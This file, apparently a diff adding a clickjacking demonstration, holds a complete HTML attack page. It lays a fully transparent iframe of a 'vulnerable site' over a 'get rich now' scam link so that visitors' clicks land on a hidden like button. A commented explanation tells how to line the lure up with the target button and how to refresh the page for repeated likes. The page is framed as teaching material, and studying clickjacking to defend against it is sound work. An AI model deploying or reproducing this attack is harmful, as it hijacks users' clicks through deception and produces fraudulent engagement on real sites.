@@ -1,0 +1,39 @@
+/*
+* Clickjacking script
+* Created by Shon Berengard
+* Easy to understand
+*/
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+	<style>
+	iframe { 
+	  width:100%;
+	  height:100%;
+	  position:absolute;
+	  top:0; 
+	  left:0;
+	  opacity:0;		/* in real life opacity=0 */
+	}
+	</style>
+  
+</head>
+<body>
+	<iframe src="http://192.168.1.2:4444/likes.php?action="></iframe>
+	<p>Click on the link to get rich now:</p>
+
+	<a href="" target="_blank">CLICK ME!</a>
+	<br/>
+	<p>You'll be rich for the whole your life!</p>
+</body>
+</html>
+
+/* __Explanation_
+* The Style is for hiding and positioning the iframe for the clickjacking. The opacity in real life is 0, but for demostration you can change it to a higher value.
+* "<iframe src="http://192.168.1.2:4444/likes.php?action="></iframe>" This code is for creating an iframe with the vulnerable site and the paramter is for removing the error and positioning the like button under the scam button.
+* "<a href="" target="_blank">CLICK ME!</a>" is for refreshing the page for more likes each click.
+* ATTENTION: THe like button on the vulnerable site is kinda small so the attack site button will work only if you clic kthe left side of it (test to see).
+*/
